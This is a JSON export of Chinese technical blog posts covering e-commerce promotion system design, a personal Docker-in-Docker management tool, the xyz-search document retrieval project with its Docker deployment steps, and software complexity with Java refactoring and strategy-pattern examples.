是否满足促销触发条件（例如，商品数量是否达到2件、总金额是否达到100元）。具体执行机制取决于采用的规则配置方案（DSL解析执行或Drools规则引擎）。 优惠金额计算：如果规则匹配成功，系统将根据 y.rule 定义的优惠方式，精确计算出 X&#39; 中每个商品应享受的优惠金额，以及该促销活动的总优惠金额。 结果聚合与返回 (Y’)：将所有满足条件并计算出优惠的促销活动收集起来，形成一个促销列表 Y&#39;，返回给调用方。每个促销结果中，不仅包含总优惠金额，还需详细列出每个参与优惠的商品及其分摊到的具体优惠金额，这对于订单详情展示和后续财务分账至关重要。 三、从淘宝看促销 在上面图片中，我们可以看到一个购物车的“金额明细”界面，其中明确展示了不同层级的优惠。 最显著的是 “店铺优惠 减 ¥34.19”。这与上文提到的“促销配置”中的“促销级别”概念紧密相关。店铺优惠通常是由商家（如“太力官方旗舰店”）自主设置的促销活动，其优惠力度和规则由店铺决定，属于店铺级别的促销。 具体到明细中，可以看到“太力官方旗舰店”下的商品享受了以下店铺级促销： “超级立减”：小计 ¥7.90，减 ¥1.19。这是一种直接针对单个商品的折扣或立减优惠。 “百亿补贴”：小计 ¥93.40，减 ¥3.00。虽然名为“百亿补贴”，但在这里它被归类到店铺名下，表明这部分补贴是由该店铺承担或与平台合作在店铺内生效的。 “智能单品补贴”：小计 ¥93.40，减 ¥10.00。这同样是一种针对单个商品进行的补贴，可能通过智能算法匹配。 “满45元减20元”：小计 ¥61.90，减 ¥20.00。这是一个典型的“满减”促销，商品金额达到45元即可减20元。 这些优惠都是“店铺优惠”的组成部分，反映了促销系统能够支持不同商家在自身权限范围内配置和执行多样化促销策略的能力。这与“促销范围”中的“店铺”维度以及“促销类型”中的“满减”、“立减”等具体类型相符，体现了促销配置的灵活性。 值得注意的是，在当前的“金额明细”展示中，我们尚未看到优惠券类型优惠的详细拆解。在电商促销模型中，优惠券通常作为一种独立的促销类型存在，它拥有自身的领取、使用规则、有效期和适用范围。其在最终价格计算中的作用和叠加逻辑，将在后续的算价环节中进行详细介绍和体现。这进一步说明了促销系统需要处理多层级、多类型的优惠叠加与互斥，以最终得出用户实际支付金额的复杂性。 结语促销系统是电商平台不可或缺的增长引擎。一个优秀的促销系统设计，不仅需要对各种促销类型有深刻的理解，更要能将复杂的业务逻辑抽象为清晰的领域模型，并通过健壮的技术架构实现高效的创建、筛选和应用。从核心概念的明确到灵活的规则配置（无论是DSL还是规则引擎），再到高效的筛选流程，每一步都至关重要。只有这样，促销系统才能真正成为助力电商企业实现持续增长的强大武器。","categories":[],"tags":[{"name":"系统设计","slug":"系统设计","permalink":"https://noogel.xyz/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"}]},{"title":"折腾 Docker 管理：一个自力更生的 DinD 工具是怎么来的","slug":"关于技术/开源项目/折腾_Docker_管理_一个自力更生的_DinD_工具是怎么来的","date":"2025-06-02T00:00:00.000Z","updated":"2025-07-24T07:48:25.440Z","comments":true,"path":"2025/06/02/1.html","permalink":"https://noogel.xyz/2025/06/02/1.html","excerpt":"","text":"说起来，玩 Docker 的朋友估计都有同样的感受：这玩意儿好用是好用，但管起来真有点头疼。市面上不是没有工具，像 Portainer 这种，功能是强大，可总觉得有点“重”。对于我这种只想简单管理几个服务、又不想折腾太多配置的人来说，它就像是开着一辆大卡车去买菜，有点过了。而且，它那套数据备份机制，说实话，我一直觉得不太顺手，总担心哪天数据丢了咋办。 正是因为这些小烦恼，心里就一直琢磨着，能不能自己搞一个更轻便、更好用的 Docker 管理工具呢？毕竟，自己的需求自己最清楚。加上这几年 AI 编程发展得挺快，就想着是不是能借力 AI，把这个想法落地。说干就干，断断续续地折腾了一阵子，还真捣鼓出来一个“Docker in Docker”的维护工具。为啥是 Docker in Docker 呢？因为我觉得这样管理起来更方便，整个工具本身也是一个 Docker 容器，便于部署和迁移，而且特别符合我对“轻量”的追求。 从“麻烦”到“方便”：这工具到底解决了啥？一开始，我的出发点就很简单：让管理 Docker 容器变得像管理文件一样方便。所以，这个工具的核心思想就是基于 Docker Compose 来维护服务。Compose 文件嘛，大家都知道，就是用 YAML 格式描述你的服务栈，简单明了。把管理重点放在 Compose 文件上，就天然地实现了像文件系统一样的管理方式。 下面，我跟大家聊聊，这个工具目前都能干点啥，解决了我的哪些痛点： 1. Compose 文件管理：就像管理普通文件一样这是我觉得最核心的功能。以前，Compose 文件散落在各个地方，管理起来比较乱。现在，我把所有的 Compose 文件都集中管理起来。 编辑、启动、停止： 你可以直接在界面上看到你的所有 Compose 项目，点一点就能编辑 YAML 文件，保存后直接启动、停止。再也不用每次都敲 docker-compose up -d 或者 docker-compose down 了。特别是修改配置后，直接在界面上改，保存即生效，这效率一下就上来了。 版本控制和备份： 因为是基于文件系统来管理 Compose 文件，所以这个工具和 NAS（网络附加存储）简直是绝配。NAS 通常都有非常成熟的快照和备份功能。这意味着，我的所有 Docker 服务配置，都像普通文件一样，可以轻松地做快照，做增量备份。就算哪天不小心改错了 Compose 文件，或者机器硬盘挂了，也能非常方便地恢复到之前的状态。这点对数据安全来说，简直是福音。想想以前，如果 Portainer 的数据损坏了，那种抓狂的感觉……现在完全不用担心了。 2. 容器日志检查：一眼看穿问题所在服务跑起来了，最怕的就是出问题。出问题了，第一个想到的就是看日志。 实时查看日志： 这个工具可以直接查看运行中容器的实时日志。你不需要 SSH 登录服务器，也不用敲 docker logs 命令，直接在网页上就能看到日志输出。这对于快速排查问题来说，简直是太方便了。特别是有些服务日志刷得飞快，能实时看到，效率高很多。 筛选和搜索： 当然，日志多了也容易眼花。我还在考虑加上一些日志筛选和搜索功能，比如按关键词搜索、按时间段过滤，这样就能更快地定位到关键信息。目前虽然还比较基础，但已经比没有好太多了。 3. 镜像管理：瘦身和加速下载两不误Docker 玩久了，镜像会越来越多，硬盘空间也会越来越紧张。 拉取和删除镜像： 这个工具可以很方便地拉取新的镜像，也能删除不再需要的镜像。界面上能清晰地看到本地有哪些镜像，占用了多少空间。定期清理一下，保持系统“身材”，挺重要的。 代理设置： 这个功能真是解决了一个大痛点！在国内，大家拉取 Docker 镜像经常会遇到网络问题，慢得让人抓狂，甚至直接超时。我把代理设置功能集成进来了，你可以直接配置 Docker Daemon 的代理，这样以后拉取镜像就快多了，再也不用眼巴巴地看着进度条了。对于经常需要拉取新镜像的朋友来说，这简直是救星。 4. 运行统计：对资源使用情况心里有数虽然是个轻量工具，但对系统资源的监控也不能少。 CPU、内存、网络使用： 工具能显示各个容器的 CPU、内存占用情况，以及网络流量。这样你就能大致了解哪些服务是“耗电大户”，哪些服务跑得比较轻。对于优化资源分配，或者判断服务是否正常运行，都有很大帮助。虽然不是专业的监控工具，但对于个人使用来说，足够了。 5. 最近活动：一目了然的操作记录谁操作了什么，什么时候操作的，这些信息有时候挺重要的。 操作日志： 工具会记录一些最近的操作，比如哪个 Compose 项目被启动了，哪个镜像被删除了等等。这样你就能知道系统最近发生了什么，也方便追溯一些异常操作。 6. 接入群晖 SSO 登录：为了方便，也为了安全因为我自己是群晖 NAS 用户，经常会用到群晖的 SSO（单点登录）功能。为了方便，也为了安全性，我把这个工具接入了群晖 SSO。 无缝登录： 这样一来，我可以直接用群晖账号登录这个 Docker 管理工具，不用再单独记住一套账号密码。方便不说，安全性也提高了不少，毕竟群晖的账号通常都会设置两步验证。 AI 辅助编程：这工具咋来的？讲到这里，估计有朋友会好奇，这些功能都是怎么实现的？老实说，我不是专业的全栈开发者，很多技术点我之前都不是很熟悉。这次能够把这个工具落地，AI 辅助编程功不可没。 可以说，这个工具 90% 以上的代码，都是在 AI 的帮助下完成的。一开始，我只是把我的想法和需求告诉 AI，比如“我需要一个网页界面，可以上传 Docker Compose 文件”，“我需要能实时查看容器日志”。AI 会根据我的描述，生成一些代码片段，或者提供一些实现思路。 在开发过程中，可以直接截图沟通，粘贴错误代码、错误运行日志，或者进行功能沟通、页面拆分等，尽量不要直接手动修改代码。实际发现手动修改后会影响 AI 对代码库的理解。有时候，AI 提供的代码可能不是最完美的，甚至会有一些小错误，但它提供了一个非常好的起点。 这种开发模式，让一个本来对前端都不算精通的人，也能独立开发出一些实用的工具。它大大降低了开发的门槛，让更多有想法的人有机会把想法变成现实。让 AI 根据我的需求来创建，先上一个万能模板，后续可以直接修改关键信息让 AI 生成不同的项目。 123456你是一位产品经理+UI设计师+全栈工程师，同时精通UI设计，基于当前 docker compose html 页面进行全面修改：1、使用FontAwesome等开源图标库，让原型显得更精美和接近真实i0S/Android设计规范的界面； 2、引入tailwind css来完成，而不是变成style样式，图片使用unsplash；3、结合现有页面功能，美化界面展示样式，对于按钮弹窗和列表进行优化，考虑后端接口响应速度慢优化操作体验；4、以设计师的视角去输出完整的UI/UX，以产品经理的视角去规划APP的功能、页面和交互,要求移动设备自适应；5、使用 flask 模板 + Python，输出 index.html，可以通过多个模板页面，内容完整。 未来展望：还有哪些可以折腾的？虽然这个工具已经解决了我的不少痛点，但肯定还有很多可以改进和扩展的地方。 更完善的监控： 比如可以加入更多的容器性能指标，做成图表展示，让资源使用情况更直观。 模板功能： 可以预设一些常用的 Compose 模板，这样创建新服务的时候就更快了。 Web Shell： 如果能直接在网页上提供一个容器的 Shell 界面，那排查问题就更方便了。 当然，所有这些，都会继续秉承“轻量”、“易用”的原则。我还是希望它能保持简洁，而不是变成一个大而全、功能臃肿的工具。 结语折腾这个 Docker 管理工具，从最开始的一个小念头，到现在能基本满足我的日常需求，整个过程还是挺有意思的。它让我体会到了“自己动手，丰衣足食”的乐趣，也让我看到了 AI 辅助编程的巨大潜力。目前这个工具仅仅应用在我的 NAS 上管理众多的 docker 服务，后续优化后再考虑开源出来。 这个工具可能不像那些专业的商业产品那么光鲜亮丽，但它是我根据自己的实际需求，一点点打磨出来的。它简单、实用，对我来说，这就够了。如果你也有类似的烦恼，或者对这种“轻量级”的 Docker 管理方式感兴趣，也许我的这些折腾能给你一些启发。","categories":[],"tags":[{"name":"项目","slug":"项目","permalink":"https://noogel.xyz/tags/%E9%A1%B9%E7%9B%AE/"}]},{"title":"畅文全索：文档检索系统的探索与实践","slug":"关于技术/开源项目/畅文全索_文档检索系统的探索与实践","date":"2025-04-18T00:00:00.000Z","updated":"2025-07-23T18:20:05.316Z","comments":true,"path":"2025/04/18/1.html","permalink":"https://noogel.xyz/2025/04/18/1.html","excerpt":"在日常的信息处理中，有效管理和查找文档是许多人面临的实际需求。无论是个人积累的资料，还是团队共享的文档，一个可靠的检索工具都能提供帮助。本文将介绍 畅文全索（xyz-search），一个基于 Spring Boot 和 ElasticSearch 开发的文档检索系统，旨在为用户提供一种相对便捷的文档内容查找方案。 💡 项目概述：畅文全索的功能定位畅文全索被定位为一个辅助性的全文检索系统。它基于 Spring Boot 和 ElasticSearch 构建，尝试支持多种文件格式的全文内容检索。通过整合 Spring AI 功能，系统也具备了初步的智能搜索和内容分析能力，以期为用户提供更精准的检索体验。 本系统适用于个人文档管理或小型数字文档集合的检索场景，可处理一定规模的文档数据。它旨在为用户提供一个可行的文档检索和管理工具。 你可以在 GitHub 上找到畅文全索的开源代码。","text":"在日常的信息处理中，有效管理和查找文档是许多人面临的实际需求。无论是个人积累的资料，还是团队共享的文档，一个可靠的检索工具都能提供帮助。本文将介绍 畅文全索（xyz-search），一个基于 Spring Boot 和 ElasticSearch 开发的文档检索系统，旨在为用户提供一种相对便捷的文档内容查找方案。 💡 项目概述：畅文全索的功能定位畅文全索被定位为一个辅助性的全文检索系统。它基于 Spring Boot 和 ElasticSearch 构建，尝试支持多种文件格式的全文内容检索。通过整合 Spring AI 功能，系统也具备了初步的智能搜索和内容分析能力，以期为用户提供更精准的检索体验。 本系统适用于个人文档管理或小型数字文档集合的检索场景，可处理一定规模的文档数据。它旨在为用户提供一个可行的文档检索和管理工具。 你可以在 GitHub 上找到畅文全索的开源代码。 ✨ 主要功能：畅文全索的特点畅文全索在功能设计上，尝试涵盖了文档检索的一些核心需求： 📄 多种文档格式支持系统在文档兼容性方面进行了一些尝试，目前支持多种常见文档格式的解析和索引： 办公文档：PDF、Word (docx)、Excel (xlsx)、PowerPoint 电子书：EPUB (支持内容解析与索引) 图像识别：通过集成 PaddleOCR，可提取图片中的文本信息。 多媒体：支持部分视频元数据索引。 网页与文本：支持 HTML 和纯文本文件 (TXT, MD, JSON 等)。 🔎 基础检索能力畅文全索的检索功能基于 ElasticSearch，提供了一些常用的搜索特性： 全文索引：采用 ElasticSearch 作为底层索引技术。 中文分词：支持中文文本的分词处理。 索引更新：具备基本的实时索引更新机制。 属性过滤：支持文件属性的过滤检索。 结果高亮：对搜索结果中的关键词进行高亮显示。 🤖 AI 功能的引入系统引入了 AI 相关功能，尝试提升检索的智能化程度： Spring AI 集成：利用 Spring AI 框架进行功能扩展。 语言模型辅助：尝试基于大语言模型进行内容理解。 对话式检索：支持初步的自然语言对话式检索模式。 Ollama 模型支持：可配置本地部署 Ollama 模型。 📚 电子书管理辅助对于电子书爱好者，系统也提供了一些辅助管理功能： OPDS 协议支持：兼容 OPDS 电子书协议。 EPUB 阅读：内置简易的在线 EPUB 阅读器。 💻 界面设计与操作系统提供了基本的 Web 界面，以方便用户操作： Web 界面：提供一个简洁的 Web 交互界面。 文档上传：支持文件上传功能。 文件采集：可设置自动采集指定目录下的文件。 移动端适配：界面设计考虑了响应式布局。 系统以 Spring Boot 作为主要开发框架，提供了 Web 界面和各类 API 接口。内部功能模块包括搜索、索引、AI 和文件服务。数据存储方面，主要依赖 ElasticSearch 进行全文索引，SQLite 用于系统配置数据，而 AI 功能则通过 Spring AI 实现。文件存储则独立进行管理。 🚀 部署指引：如何启动畅文全索以下是使用 Docker 快速启动畅文全索的基本步骤： 通过预构建 Docker 镜像启动： 拉取镜像： 1docker pull noogel/xyz-search:latest 运行容器： 1234docker run -d --name xyzSearch --network xyz-bridge-net -p 8081:8081 \\-v /path/to/searchData:/usr/share/xyz-search/data \\-v /path/to/share:/data/share \\noogel/xyz-search:latest 请将示例路径 /path/to/searchData 和 /path/to/share 替换为实际的文件存储位置。 系统默认配置如下： 管理员账号：xyz 初始密码：search 访问地址：http://localhost:8081 注意：系统初始密码可在配置页面修改。当前版本账号不支持修改。建议在较为受控的网络环境中使用。 🔧 配置说明：定制化选项系统启动后，用户可在 Web 界面进行必要的参数调整： 索引目录：指定需要进行索引的文档主目录，并可设置排除的子目录。 文件自动采集：配置监控源目录、目标存储目录、文件类型过滤规则以及是否自动删除源文件。 OPDS 服务根目录：建议配置为 Calibre 库目录。 文件存储路径：包括手动上传和标记删除文件的存储路径。 通知邮件配置：用于系统访问通知的邮件设置。 OCR 服务：配置 PaddleOCR 服务地址。 外部搜索链接：自定义文档详情页的外部搜索链接，如豆瓣、京东、谷歌。 AI 对话检索：配置 AI 功能的启用状态，以及 Ollama、Elasticsearch 和 Qdrant 等相关服务的参数。 🐳 Docker Compose 部署：集成服务对于偏好使用 Docker Compose 的用户，我们也提供了相应的配置，可以方便地部署包含 Elasticsearch、Qdrant 等服务的完整环境： 创建一个 docker-compose.yml 文件，并添加以下内容： 1234567891011121314151617version: &#x27;3&#x27;services: xyz-search: image: noogel/xyz-search:latest container_name: xyzSearch restart: always ports: - &quot;8081:8081&quot; volumes: - ./searchData:/usr/share/xyz-search/data - ./share:/data/share networks: - xyz-netnetworks: xyz-net: driver: bridge 在 docker-compose.yml 所在目录执行： 1docker-compose up -d 这将启动畅文全索服务。如需部署完整的服务栈（包含 Elasticsearch、Qdrant 和 PaddleOCR），请参考项目仓库中的详细 docker-compose.yml 配置。 📊 开发计划与贡献畅文全索仍在持续改进中。目前已完成的功能包括 RAG 检索增强模型优化和中文分词准确率改进。未来的开发计划包括： 全新的响应式搜索界面 多用户系统支持 支持更多文档格式 我们欢迎对本项目感兴趣的开发者参与贡献，无论是功能开发、文档完善、Bug 修复，还是性能优化建议，都将为项目的进步提供帮助。 📄 许可证本项目遵循 GNU General Public License v3.0 许可证。 希望以上内容能为您提供关于畅文全索的基本信息。如果您有进一步的疑问或建议，欢迎交流。","categories":[],"tags":[{"name":"项目","slug":"项目","permalink":"https://noogel.xyz/tags/%E9%A1%B9%E7%9B%AE/"}]},{"title":"软件系统复杂性治理方法","slug":"关于技术/架构总结/软件系统复杂性治理方法","date":"2024-02-13T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2024/02/13/1.html","link":"","permalink":"https://noogel.xyz/2024/02/13/1.html","excerpt":"本文讨论了软件复杂性及其产生原因，介绍了如何度量软件复杂性，及 SOLID 软件设计原则，并探讨管理复杂性的方法，包括使用代码重构、设计模式、领域驱动设计等。通过遵循这些原则和方法，开发人员可以降低软件复杂性，提高代码质量和可维护性。这篇文章内容涵盖了软件开发的道与术，希望能对你所有帮助，欢迎评论交流～ 什么是软件复杂性 软件复杂性产生原因 如何度量软件复杂性 SOLID 软件设计原则 管理复杂性的方法","text":"本文讨论了软件复杂性及其产生原因，介绍了如何度量软件复杂性，及 SOLID 软件设计原则，并探讨管理复杂性的方法，包括使用代码重构、设计模式、领域驱动设计等。通过遵循这些原则和方法，开发人员可以降低软件复杂性，提高代码质量和可维护性。这篇文章内容涵盖了软件开发的道与术，希望能对你所有帮助，欢迎评论交流～ 什么是软件复杂性 软件复杂性产生原因 如何度量软件复杂性 SOLID 软件设计原则 管理复杂性的方法 什么是软件复杂性软件系统复杂性指的是系统内部组件、模块、包、类、方法之间的交互关系以及整体设计的复杂程度。这种复杂度可能源自于多方面因素，包括但不限于代码规模、结构的混乱程度、各个模块之间的耦合度、算法的复杂性以及系统中存在的条件分支和循环等。 系统复杂度的高低直接影响着软件的可理解性、可维护性和可扩展性。高复杂度的系统通常意味着更难以理解和修改，也更容易引入错误。此外，复杂度过高还会增加软件开发和维护的成本。 所以说理解和管理软件系统复杂度至关重要。通过采用适当的设计原则、模式和工程实践，以及持续的重构和优化，可以有效地控制和降低软件系统的复杂度，从而提高系统的可维护性、可理解性和可靠性。 以下是两个相同功能的示例代码段，通过对比可以观察下复杂性差异： 多层嵌套条件语句 1234567891011121314151617181920212223public void processOrder(Order order) &#123; if (order != null) &#123; if (order.isValid()) &#123; if (order.getPaymentStatus() == PaymentStatus.PAID) &#123; if (order.getShippingStatus() == ShippingStatus.SHIPPED) &#123; if (order.getShippingAddress() != null) &#123; // 执行订单处理操作 &#125; else &#123; // 发送错误消息：缺少配送地址 &#125; &#125; else &#123; // 发送错误消息：订单未发货 &#125; &#125; else &#123; // 发送错误消息：订单未支付 &#125; &#125; else &#123; // 发送错误消息：无效订单 &#125; &#125; else &#123; // 发送错误消息：订单为空 &#125;&#125; 通过早期返回重构 12345678910111213141516171819202122232425262728public void processOrder(Order order) &#123; if (order == null) &#123; // 发送错误消息：订单为空 return; &#125; if (!order.isValid()) &#123; // 发送错误消息：无效订单 return; &#125; if (order.getPaymentStatus() != PaymentStatus.PAID) &#123; // 发送错误消息：订单未支付 return; &#125; if (order.getShippingStatus() != ShippingStatus.SHIPPED) &#123; // 发送错误消息：订单未发货 return; &#125; if (order.getShippingAddress() == null) &#123; // 发送错误消息：缺少配送地址 return; &#125; // 执行订单处理操作&#125; 上面两段代码，通过对比可以发现第一段代码展示了典型的深度嵌套条件语句，可读性差、扩展性差。第二段重构后的代码使用了早期返回的方式，将每个条件检查分开处理，遇到不满足条件的情况就提前返回错误消息。这样可以减少嵌套的条件语句，提高代码的可读性和可维护性。 第二段代码是对第一段代码的改进，但也是存在一定的可读性和扩展性差的问题的，提前返回是一种断路思考方式，不利于记忆，如果方法比较长，或者后期叠代码使方法变得很长，是不太容易梳理出”什么情况下会执行订单处理操作”，你需要记住各种断路情况。 系统复杂性产生的原因复杂性是系统的固有属性，它来源于系统的规模、结构、功能、行为等多个方面，有外在和内在两方面原因，下面列举几点： 需求变更随着时间的推移，产品需求会不断变化。这些变化可能需要对现有系统进行修改或添加新功能，从而增加了软件系统的复杂性。 技术选型选择不合适的技术栈或架构模式可能会导致系统的过度复杂化。有时为了解决一个小问题可能会引入大量不必要的技术组件，使系统变得更加复杂。 规模扩大随着业务的发展，软件系统可能需要处理更多种类的数据和用户，这会导致系统规模的扩大，系统的元素和关系会随着规模的增大而增多。 不完善的设计缺乏清晰的系统设计和架构规划可能导致系统出现混乱和复杂性。如果最初的设计没有考虑到系统的未来发展，系统将很快变得难以管理和理解。 巨著《人月神话》中提出了两个重要概念： 本质复杂度：是指由软件系统所需解决的问题本身所固有的复杂性。它是由问题的本质属性和要求所决定的，与软件实现的细节无关。 偶然复杂度：是指由软件实现过程中引入的额外复杂性。它是由设计决策、技术选择、代码结构等因素所导致的。 偶然复杂度不是待求解问题的本质，相对而言， 本质复杂度和待求解问题的本质有关，是无法避免的。偶然复杂度一般是在选用求解问题的方法时所引入的。上面列举的四点，其中技术选型不当和不完善的设计都是因为开发人员经验和预判不足而产生的，属于偶然复杂度；而需求变更和规模扩大则是待求解问题逐渐变多变复杂而产生的，属于本质复杂度。 如何度量软件复杂性之前写过一篇简单介绍过 软件架构与系统复杂性，下面主要介绍软件系统复杂度度量方式。 圈复杂度（Cyclomatic Complexity）圈复杂度是一种用来衡量代码复杂性的指标，它通过计算代码中独立路径的数量来评估代码的复杂程度。通俗地说，圈复杂度越高，代码的可读性和维护性就越差。 时间空间复杂度时间复杂度是用于衡量程序在执行过程中所需的时间资源的多少，而空间复杂度则衡量程序在执行过程中所需的内存资源的多少。 代码行数代码行数是衡量软件规模和复杂度的一种指标。通常情况下，代码行数越多，系统的复杂度也越高。然而，这并不是绝对的，因为有时候简洁的代码可能实现了复杂的功能。 嵌套层数嵌套层数指的是代码中条件语句、循环语句和函数调用的嵌套深度。如果嵌套层数过多，会导致代码逻辑混乱，增加代码的理解和维护难度。 组件的相互依赖关系软件系统中各个组件之间的相互依赖关系也是衡量复杂度的重要标准。如果组件之间的依赖关系错综复杂，那么系统的修改和扩展将变得困难。 SOLID 软件设计原则通常来说，要想构建一个好的软件系统，应该从写整洁的代码开始做起。毕竟，如果建筑所使用的砖头质量不佳，那么架构所能起到的作用也会很有限。反之亦然，如果建筑的架构设计不佳，那么其所用的砖头质量再好也没有用。SOLID 是一组软件设计原则，旨在帮助开发人员设计可维护、可扩展和易于理解的软件架构。下面简要介绍每个原则： 单一职责原则（Single Responsibility Principle，SRP）：一个类应该只有一个引起它变化的原因。这意味着一个类应该只负责一项明确定义的职责或功能，这样可以使类更加内聚，易于理解和修改。 开放封闭原则（Open-Closed Principle，OCP）：软件实体（类、模块、函数等）应该对扩展开放，对修改封闭。这意味着在修改现有代码时，应该通过扩展现有代码的行为来实现变化，而不是直接修改已有的代码。 里氏替换原则（Liskov Substitution Principle，LSP）：子类应该能够替换其父类并且不会破坏系统的正确性。这意味着子类应该能够在不改变程序正确性的前提下，替代父类的行为。这样可以确保代码的可靠性和可扩展性。 接口隔离原则（Interface Segregation Principle，ISP）：客户端不应该依赖于它不需要的接口。这意味着接口应该尽量小而专注，而不是大而笼统。通过定义精确的接口，可以避免客户端依赖无关的接口，提高系统的灵活性和可维护性。 依赖倒置原则（Dependency Inversion Principle，DIP）：高层模块不应该依赖于低层模块，而是应该依赖于抽象。这意味着应该通过抽象来解耦模块之间的依赖关系，使得系统更加灵活和可扩展。 这些原则共同强调了代码的高内聚性、低耦合性和可扩展性。遵循这些原则可以提高代码的可维护性、可测试性和可重用性，从而使软件架构更加健壮和可靠。你可能会说道理我都懂但是做不到，王阳明在《传习录》中说，“未有知而不行者，知而不行，只是未知”，如果不能在开发中深切体会这些原则的精髓那便是不懂，是需要在日常开发中不断思考和体会的。 控制和管理复杂性的方法如果你读到这里，说明看过了很多 “大泥球” 代码，想找到其中的破解之道，下面会抽丝剥茧，介绍一些方式方法。 “大泥球”（Big Ball of Mud）是指一种缺乏清晰结构和良好架构的代码，通常随着时间推移不断添加功能和修复问题而产生。还是以上面的代码为例，展示一个可能被称为”大泥球”代码的案例： 1234567891011121314151617181920212223242526272829303132333435public void processOrder(Order order) &#123; if (order != null) &#123; if (order.isValid()) &#123; if (order.getPaymentStatus() == PaymentStatus.PAID) &#123; if (order.getShippingStatus() == ShippingStatus.SHIPPED) &#123; if (order.getShippingAddress() != null) &#123; if (order.isGiftOrder()) &#123; if (order.getGiftMessage() != null) &#123; if (order.getGiftWrapOption() == GiftWrapOption.SELECTED) &#123; // 执行礼品订单处理操作（更多嵌套逻辑） &#125; else &#123; // 发送错误消息：未选择礼品包装选项 &#125; &#125; else &#123; // 发送错误消息：缺少礼品留言 &#125; &#125; else &#123; // 执行非礼品订单处理操作 &#125; &#125; else &#123; // 发送错误消息：缺少配送地址 &#125; &#125; else &#123; // 发送错误消息：订单未发货 &#125; &#125; else &#123; // 发送错误消息：订单未支付 &#125; &#125; else &#123; // 发送错误消息：无效订单 &#125; &#125; else &#123; // 发送错误消息：订单为空 &#125;&#125; 如果要增加一个判断订单是否为礼品订单的处理逻辑，最直接的方式是在其基础上继续嵌套更多的条件判断。久而久之这样的“大泥球”代码就存在多层嵌套的条件判断，逻辑复杂、难以理解和维护。 小重构对于超大型的方法和类，最简单的、较低风险的方式是拆分方法和类，之前写过一篇小文章 从小重构说起。对于方法和类的拆分，可以借助 IDE 来实现，这样可以进一步降低风险；对于静态变量需要提取到公共配置类；通常来说业务方法大都是无状态的，对于有状态方法需要谨慎操作。 要提高上面方法的可读性和可维护性，可以将其拆分成更小的方法。下面是重构后的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public void processOrder(Order order) &#123; if (order == null) &#123; sendErrorMessage(&quot;订单为空&quot;); return; &#125; if (!order.isValid()) &#123; sendErrorMessage(&quot;无效订单&quot;); return; &#125; if (order.getPaymentStatus() != PaymentStatus.PAID) &#123; sendErrorMessage(&quot;订单未支付&quot;); return; &#125; if (order.getShippingStatus() != ShippingStatus.SHIPPED) &#123; sendErrorMessage(&quot;订单未发货&quot;); return; &#125; if (order.getShippingAddress() == null) &#123; sendErrorMessage(&quot;缺少配送地址&quot;); return; &#125; if (order.isGiftOrder()) &#123; processGiftOrder(order); &#125; else &#123; processStandardOrder(order); &#125;&#125;private void processStandardOrder(Order order) &#123; // 执行非礼品订单处理操作&#125;private void processGiftOrder(Order order) &#123; if (order.getGiftMessage() == null) &#123; sendErrorMessage(&quot;缺少礼品留言&quot;); return; &#125; if (order.getGiftWrapOption() != GiftWrapOption.SELECTED) &#123; sendErrorMessage(&quot;未选择礼品包装选项&quot;); return; &#125; // 执行礼品订单处理操作&#125;private void sendErrorMessage(String message) &#123; // 发送错误消息&#125; 重构后的代码中，我们将原来的单个方法拆分成了多个方法。processOrder 方法负责处理整个订单流程的控制，进行基本的前置条件检查，然后根据订单类型（礼品订单或非礼品订单）调用相应的处理方法。 processStandardOrder 方法用于处理非礼品订单，而 processGiftOrder 方法用于处理礼品订单。这样，我们可以在具体的处理方法中添加更多的逻辑，而不会让整个代码过于复杂。同时，通过使用早期返回，遇到不满足条件的情况就会提前返回错误消息，避免了过多的嵌套条件。 另外，我们还引入了一个辅助方法 sendErrorMessage，用于发送错误消息，避免了重复的代码。 这样的重构使得代码结构更加清晰，逻辑更易于理解和维护。每个方法负责一个具体的任务，代码的可读性和可维护性都得到了提升。 设计模式随着需求发生变化，不同状态的订单需要有不同的处理方式，当当前的方法不再满足现状时，就需要进行扩充，复杂度也会相应提升。为了进一步应对复杂度的提升，可以考虑适合的设计模式。 设计模式通过提供可重用的解决方案，帮助我们管理软件复杂度。它们提供了一种通用的、经过验证的方法来解决常见的软件设计问题，使得系统更易于理解、扩展和修改。同时，设计模式也促进了代码的重用和降低了系统的耦合度，从而提高了软件的质量和可维护性。 以上面的例子，要根据不同的订单状态生成不同的后续处理行为，可以使用策略模式来表达这一设计。策略模式允许定义一系列算法（策略），将它们封装在独立的策略类中，并使得它们可以互相替换。 下面是使用策略模式来重构的代码示例： 首先，定义一个接口 OrderProcessingStrategy，表示订单处理策略，其中包含一个 processOrder() 方法来执行订单处理操作： 123public interface OrderProcessingStrategy &#123; void processOrder(Order order);&#125; 然后，实现不同的订单处理策略，每个策略都实现 OrderProcessingStrategy 接口，并根据订单状态执行相应的处理操作： 123456789101112131415161718192021222324252627public class PaidShippedOrderStrategy implements OrderProcessingStrategy &#123; @Override public void processOrder(Order order) &#123; // 执行订单被支付且已发货的处理操作 &#125;&#125;public class PaidNotShippedOrderStrategy implements OrderProcessingStrategy &#123; @Override public void processOrder(Order order) &#123; // 执行订单被支付但未发货的处理操作 &#125;&#125;public class UnpaidOrderStrategy implements OrderProcessingStrategy &#123; @Override public void processOrder(Order order) &#123; // 执行订单未支付的处理操作 &#125;&#125;public class InvalidOrderStrategy implements OrderProcessingStrategy &#123; @Override public void processOrder(Order order) &#123; // 执行无效订单的处理操作 &#125;&#125; 接下来，在 Order 类中添加一个 process() 方法，用来触发订单的处理操作。在该方法中，根据订单状态选择相应的策略，并调用策略的 processOrder() 方法来执行处理操作： 1234567891011121314public class Order &#123; private OrderProcessingStrategy processingStrategy; // 省略其他属性和方法 public void process() &#123; if (processingStrategy == null) &#123; // 默认处理策略 processingStrategy = new InvalidOrderStrategy(); &#125; processingStrategy.processOrder(this); &#125;&#125; 最后，在客户端代码中，我们可以创建订单对象，并根据订单状态设置相应的处理策略。通过调用订单对象的 process() 方法来触发订单的处理操作： 1234567891011121314151617public class Client &#123; public static void main(String[] args) &#123; Order order = new Order(); // 根据订单状态设置对应的处理策略 if (order.getPaymentStatus() == PaymentStatus.PAID) &#123; if (order.getShippingStatus() == ShippingStatus.SHIPPED) &#123; order.setProcessingStrategy(new PaidShippedOrderStrategy()); &#125; else &#123; order.setProcessingStrategy(new PaidNotShippedOrderStrategy()); &#125; &#125; else &#123; order.setProcessingStrategy(new UnpaidOrderStrategy()); &#125; order.process(); &#125;&#125; 